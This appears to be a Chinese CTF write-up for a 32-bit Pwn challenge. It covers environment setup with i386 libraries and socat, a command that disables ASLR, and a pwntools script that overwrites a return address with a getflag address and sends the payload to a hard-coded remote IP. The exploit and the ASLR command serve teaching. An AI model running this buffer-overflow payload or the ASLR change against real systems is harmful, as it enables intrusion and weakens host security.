ailx10说：这篇是我2024年1月写的。我用 Mac M1 做这道 32 位 Pwn 题时，第一关竟然是环境。为了让样本跑起来，我把它放到 x86 的 VPS，补兼容库，用 socat 接交互，再进 IDA 和 GDB 看无限长度输入会覆盖到哪里。最后才是找 getflag、量偏移、改返回地址。这篇把这些前置折腾也记下来了，因为只看最后一段载荷，很容易以为题目一开始就能顺顺当当地调试。所以这篇不只写了最后怎么覆盖返回地址，也写了为了能开始调试，先在平台和依赖上绕过的那一圈。

本题重点是定位无长度限制的输入、确定栈布局，再观察返回地址改变。

（1）原样本为 32 位 x86 程序；作者在另一台 x86 主机上运行。示例中旧服务器地址仅是历史记录，不应连接。


原记录尝试安装 32 位运行库。下列安装命令和软件源依赖发行版，应在隔离实验环境核对；scp 的端口选项也须放在源与目标之前。

```
dpkg --add-architecture i386

apt install libc6:i386 libncurses5:i386 libstdc++6:i386

apt update



# 小插曲，有些安装失败的

apt install --reinstall libc6:i386

apt install --reinstall libgcc-s1:i386





apt install libc6-dev-i386

apt install gcc-multilib g++-multilib

apt install libc6-dev-i386
```

然后通过socat进行端口转发，这样就可以在MAC M1上享受`pwn`的快乐了

```
socat TCP4-LISTEN:10086,reuseaddr,fork,su=nobody EXEC:./pwnme1-Pwn基础
```

原实验在隔离环境中关闭 ASLR 以降低难度；该全局设置会影响整个系统，不能作为生产环境配置。

```
echo 0 > /proc/sys/kernel/randomize_va_space
```

（7）以下为原历史脚本，地址、偏移和远端主机均属于原环境，未重新验证。不要直接连接脚本中的旧地址。

```
# python2.7



from pwn import *



# 设置远程连接信息

host = '174.137.58.6'

port = 10086



getflag_addr = 0x8048677



# 构造恶意输入，首先填充缓冲区，然后将getflag函数的地址作为返回地址写入缓冲区

payload = b"A" * (164+4)  # 缓冲区溢出填充

payload += p32(getflag_addr)  # 将getflag函数的地址作为返回地址



# 创建一个与目标程序的连接

io = remote(host, port)

io.sendlineafter(">> 6. Exit", "5")

# 发送payload给目标程序

io.sendlineafter("Please input the name of fruit:", payload)



# 接收并打印目标程序的输出

print(io.recvall())
```
